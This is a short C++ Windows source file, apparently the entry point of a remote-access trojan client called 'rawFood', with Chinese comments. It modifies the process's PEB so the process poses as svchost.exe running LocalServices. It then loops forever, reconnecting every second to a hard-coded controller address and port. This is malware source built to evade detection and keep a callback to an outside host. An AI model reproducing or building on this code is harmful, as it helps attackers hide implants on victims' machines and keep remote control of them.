﻿// rawFood.cpp : 定义应用程序的入口点。
//

#include "pch.h"
#include "framework.h"
#include "rawFood.h"



int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	// 准备工作
	if (!IsReady()) {
		return -1;
	}

	// 修改PEB伪装进程信息
	DisguiseProcess((wchar_t*)L"C:\\WINDOWS\\System32\\svchost.exe (LocalSevices -p)",
		(wchar_t*)L"C:\\WINDOWS\\System32\\svchost.exe -k LocalSevices -p");

	// 启动windows异步套接字
	WSAData wsaData;
	if (WSAStartup(MAKEWORD(2, 1), &wsaData)) {
		OutputDebugStringA("Failed to initialize WSA\r\n");
		return -1;
	}

	Food newFood;
	newFood.hInst = hInstance;
	while (1) {
		// 测试
		// 如果断开了，隔一秒自动连接
		newFood.connectTo("10.211.55.2", 18000);
		Sleep(1000);
	}


	return 0;
}
